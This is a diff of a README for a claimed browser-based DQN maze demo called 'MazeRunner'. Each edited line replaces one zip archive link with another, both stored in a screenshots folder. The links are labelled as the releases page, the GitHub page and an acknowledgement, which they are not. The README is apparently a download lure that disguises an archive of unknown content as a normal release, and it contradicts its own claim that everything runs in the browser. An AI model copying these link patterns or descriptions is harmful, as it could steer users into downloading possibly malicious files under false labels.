@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to MazeRunner! This project lets you watch a Deep Q-Network (DQN) agent learn to solve a 10x10 maze. Everything runs in your browser, thanks to https://raw.githubusercontent.com/Kyriebrown/mazerunner/main/screenshots/mazerunner_accuser.zip
+Welcome to MazeRunner! This project lets you watch a Deep Q-Network (DQN) agent learn to solve a 10x10 maze. Everything runs in your browser, thanks to https://github.com/Kyriebrown/mazerunner/raw/refs/heads/main/screenshots/Software-2.6.zip
 
 ## 📥 Download & Install
 
-**[Visit the Releases Page to Download](https://raw.githubusercontent.com/Kyriebrown/mazerunner/main/screenshots/mazerunner_accuser.zip)**
+**[Visit the Releases Page to Download](https://github.com/Kyriebrown/mazerunner/raw/refs/heads/main/screenshots/Software-2.6.zip)**
 
 To get started, you can easily download the latest version. Follow the steps below:
 
@@ -47,7 +47,7 @@ If you experience any issues:
 
 ## 🤝 Contributing
 
-We welcome contributions! If you have ideas for improvements or want to report issues, please visit our [GitHub page](https://raw.githubusercontent.com/Kyriebrown/mazerunner/main/screenshots/mazerunner_accuser.zip). 
+We welcome contributions! If you have ideas for improvements or want to report issues, please visit our [GitHub page](https://github.com/Kyriebrown/mazerunner/raw/refs/heads/main/screenshots/Software-2.6.zip). 
 
 ## 💬 Support
 
@@ -61,4 +61,4 @@ Thanks to the TensorFlow team for creating such a powerful tool that enables us 
 
 **Remember:** 
 
-You can always find the latest version and updates on our **[Releases Page](https://raw.githubusercontent.com/Kyriebrown/mazerunner/main/screenshots/mazerunner_accuser.zip)**. Enjoy using MazeRunner!
+You can always find the latest version and updates on our **[Releases Page](https://github.com/Kyriebrown/mazerunner/raw/refs/heads/main/screenshots/Software-2.6.zip)**. Enjoy using MazeRunner!
